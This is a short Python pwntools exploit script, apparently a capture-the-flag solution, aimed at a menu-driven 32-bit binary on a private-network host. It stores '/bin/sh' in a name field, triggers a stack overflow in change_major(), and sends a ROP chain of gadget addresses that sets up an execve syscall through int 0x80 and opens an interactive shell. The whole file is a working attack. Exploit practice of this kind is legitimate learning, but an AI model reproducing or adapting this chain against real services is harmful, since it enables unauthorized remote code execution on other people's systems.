#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote("192.168.80.132",30001)

p_eax = 0x080BC396
p_esi = 0x080551B2
p_edi = 0x08052FFA
p_edx = 0x0807338A
p_ecx = 0x080E4325	
p_ebx = 0x080538EB	
int_80 = 0x08071005	
binsh = 0x080f1a20	#first_name address

payload = 'A'*32		#padding


##set the value of register
payload += p32(p_eax)	
payload += p32(0xb)		#eax = 0xb
payload += p32(p_esi)
payload += p32(0)		#esi = 0
payload += p32(p_edi)
payload += p32(0)		#edi = 0
payload += p32(p_edx)
payload += p32(0)		#edx = 0
payload += p32(p_ecx)
payload += p32(0)		#ecx = 0
payload += p32(p_ebx)
payload += p32(binsh)	#ebx = &("/bin/sh")


payload += p32(int_80)	#int 0x80


io.sendline("/bin/sh")	#first_name里面存储"/bin/sh"
io.sendline('A')		#随便输入
io.sendline('A')		#随便输入
io.sendline('y')		#选y进入函数first_day_corps()
io.sendline('2')		#选项2进入change_major()，触发栈溢出

io.sendline(payload)
io.interactive()

